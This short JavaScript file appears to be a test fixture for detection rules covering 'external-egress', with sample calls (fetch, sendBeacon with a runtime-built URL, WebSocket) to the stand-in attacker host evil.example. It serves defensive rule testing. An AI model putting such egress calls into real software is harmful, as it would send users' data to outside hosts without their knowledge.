// Exfiltration surface (§1.3).
// Rules: external-egress, external-egress-assembled

// external-egress: static off-package origin (allowed_origins is empty)
fetch('https://evil.example/collect');

// external-egress-assembled: URL assembled at runtime from an external fragment
var endpoint = 'https://evil.example/beacon?id=' + Math.random();
navigator.sendBeacon(endpoint, 'ping');

// WebSocket to an external origin (static)
var sock = new WebSocket('wss://evil.example/socket');
